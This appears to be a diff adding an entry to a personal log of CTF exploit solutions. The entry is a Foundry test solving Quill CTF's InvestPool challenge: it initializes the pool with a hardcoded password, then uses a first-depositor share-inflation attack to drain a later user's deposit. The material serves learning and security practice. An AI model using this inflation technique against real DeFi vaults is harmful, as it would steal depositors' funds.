@@ -1133,5 +1133,45 @@ contract PandaTokenHack is Test {
 }
 ```
 
+### 2024.09.17
+
+- Quill CTF: InvestPool
+
+ref: https://github.com/Kaiziron/quill-ctf-writeup/blob/main/invest-pool.md
+
+
+```solidity
+    function test_hack() public {
+        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
+		vm.startPrank(hacker);
+
+        // solution
+        string memory pass = 'j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx';
+        pool.initialize(pass);
+
+        // front run
+        pool.deposit(1);
+        token.transfer(address(pool), 500e18);
+
+        vm.stopPrank();
+        userDeposit(1000e18);
+        vm.startPrank(hacker);
+
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+        console.log("Hacker token balance :", token.balanceOf(hacker));
+
+        pool.withdrawAll();
+        
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+
+
+		vm.stopPrank();
+        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
+    }
+```
 
 <!-- Content_END -->
